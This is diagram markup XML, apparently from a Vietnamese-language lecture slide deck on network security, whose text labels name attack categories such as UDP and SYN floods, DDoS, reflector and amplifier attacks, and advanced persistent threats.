    <dsp:sp modelId="{D4B43EB9-34A0-4A1E-B1D2-E5931E37D5D1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="291331" y="2025085"/>
          <a:ext cx="2321718" cy="941989"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="677650"/>
                <a:satOff val="25000"/>
                <a:lumOff val="-3676"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="677650"/>
                <a:satOff val="25000"/>
                <a:lumOff val="-3676"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="677650"/>
                <a:satOff val="25000"/>
                <a:lumOff val="-3676"/>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a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" kern="1200"/>
            <a:t>Ví dụ ping (echo) request</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2000" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="318921" y="2052675"/>
        <a:ext cx="2266538" cy="886809"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{200D4077-F322-A54F-A959-16520676AF19}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3120925" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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altLang="en-US" sz="2800" b="1" kern="1200"/>
            <a:t>UDP Flood</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3120925" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{331622DA-667B-3D42-86F2-0516235F2E15}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3411140" y="937260"/>
          <a:ext cx="2321718" cy="2030730"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="1355300"/>
                <a:satOff val="50000"/>
                <a:lumOff val="-7353"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1355300"/>
                <a:satOff val="50000"/>
                <a:lumOff val="-7353"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1355300"/>
                <a:satOff val="50000"/>
                <a:lumOff val="-7353"/>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a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" kern="1200"/>
            <a:t>Thay thế sử dụng các gói tin UDP tới cổng ngẫu nhiên </a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2000" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3470618" y="996738"/>
        <a:ext cx="2202762" cy="1911774"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6240735" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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altLang="en-US" sz="2800" b="1" kern="1200"/>
            <a:t>TCP SYN Flood </a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6240735" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6530950" y="938175"/>
          <a:ext cx="2321718" cy="941989"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="2032949"/>
                <a:satOff val="75000"/>
                <a:lumOff val="-11029"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2032949"/>
                <a:satOff val="75000"/>
                <a:lumOff val="-11029"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2032949"/>
                <a:satOff val="75000"/>
                <a:lumOff val="-1102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a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" kern="1200"/>
            <a:t>Gửi TCP SYN (yêu cầu kết nối) các gói dữ liệu</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2000" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6558540" y="965765"/>
        <a:ext cx="2266538" cy="886809"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8A36DE06-37D4-4D83-9873-7337CF5E1DCC}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6530950" y="2025085"/>
          <a:ext cx="2321718" cy="941989"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>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a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" kern="1200"/>
            <a:t>Nhưng đối với cuộc tấn công dung l</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" altLang="en-US" sz="2000" kern="1200"/>
            <a:t>ư</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" kern="1200"/>
            <a:t>ợng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" kern="1200" dirty="0"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6558540" y="2052675"/>
        <a:ext cx="2266538" cy="886809"/>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9EAEE1-B141-8149-B598-A2FC9726C17B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1116" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tấn công từ chối dịch vụ phân tán</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2600" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1116" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="291331" y="937260"/>
          <a:ext cx="2321718" cy="2030730"/>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3820" tIns="62865" rIns="83820" bIns="62865" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1466850">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="3300" kern="1200"/>
            <a:t>Distributed Denial-of-Service</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="350809" y="996738"/>
        <a:ext cx="2202762" cy="1911774"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{200D4077-F322-A54F-A959-16520676AF19}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3120925" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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b="1" i="0" kern="1200">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tấn công phản xạ</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2600" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3120925" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{331622DA-667B-3D42-86F2-0516235F2E15}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3411140" y="937260"/>
          <a:ext cx="2321718" cy="2030730"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="1355300"/>
                <a:satOff val="50000"/>
                <a:lumOff val="-7353"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1355300"/>
                <a:satOff val="50000"/>
                <a:lumOff val="-7353"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="1355300"/>
                <a:satOff val="50000"/>
                <a:lumOff val="-7353"/>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3820" tIns="62865" rIns="83820" bIns="62865" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1466850">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="3300" kern="1200"/>
            <a:t>Reflector attack</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3470618" y="996738"/>
        <a:ext cx="2202762" cy="1911774"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6240735" y="0"/>
          <a:ext cx="2902148" cy="3124200"/>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altLang="en-US" sz="2600" b="1" kern="1200"/>
            <a:t>Tấn công khuyêch đại</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2600" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6240735" y="0"/>
        <a:ext cx="2902148" cy="937260"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6530950" y="937260"/>
          <a:ext cx="2321718" cy="2030730"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst>
            <a:gd name="adj" fmla="val 10000"/>
          </a:avLst>
        </a:prstGeom>
        <a:gradFill rotWithShape="0">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>
                <a:alphaOff val="0"/>
                <a:satMod val="103000"/>
                <a:lumMod val="102000"/>
                <a:tint val="94000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="50000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>
                <a:alphaOff val="0"/>
                <a:satMod val="110000"/>
                <a:lumMod val="100000"/>
                <a:shade val="100000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="accent3">
                <a:hueOff val="2710599"/>
                <a:satOff val="100000"/>
                <a:lumOff val="-14706"/>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3820" tIns="62865" rIns="83820" bIns="62865" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" lvl="0" indent="0" algn="ctr" defTabSz="1466850">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="35000"/>
            </a:spcAft>
            <a:buNone/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="3300" kern="1200"/>
            <a:t>Amplifier attack</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3300" b="1" i="0" kern="1200" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6590428" y="996738"/>
        <a:ext cx="2202762" cy="1911774"/>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8228B3-DD94-4E9E-AD1B-B86615D12633}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="12712" y="73916"/>
          <a:ext cx="6908800" cy="1625600"/>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altLang="en-US" sz="2500" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Advanced</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="2500" b="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="228600" lvl="1" indent="-228600" algn="l" defTabSz="889000">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="vi-VN" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Sử dụng bởi những kẻ tấn công </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>với</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> nhiều công nghệ xâm nhập và phần mềm </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="2000" i="1" kern="1200">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>độc hạ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="2000" i="1" kern="1200">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>i</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="2000" i="1" kern="1200">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>. </a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="2000" i="1" kern="1200" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="60324" y="121528"/>
        <a:ext cx="5154651" cy="1530376"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{07225F6F-5DFB-4E28-A2CA-D9DA0426DCC3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="609599" y="1896533"/>
          <a:ext cx="6908800" cy="1625600"/>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altLang="en-US" sz="2500" b="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Persistent</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="2500" b="1" kern="1200" dirty="0"/>
        </a:p>
        <a:p>
          <a:pPr marL="228600" lvl="1" indent="-228600" algn="l" defTabSz="889000">
            <a:lnSpc>
              <a:spcPct val="90000"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPct val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPct val="15000"/>
            </a:spcAft>
            <a:buChar char="•"/>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Tấn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>công</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>trong</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>một</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>khoảng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thời</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>gian</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>dài</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đối</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" sz="2000" i="1" kern="1200" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>với</a:t>
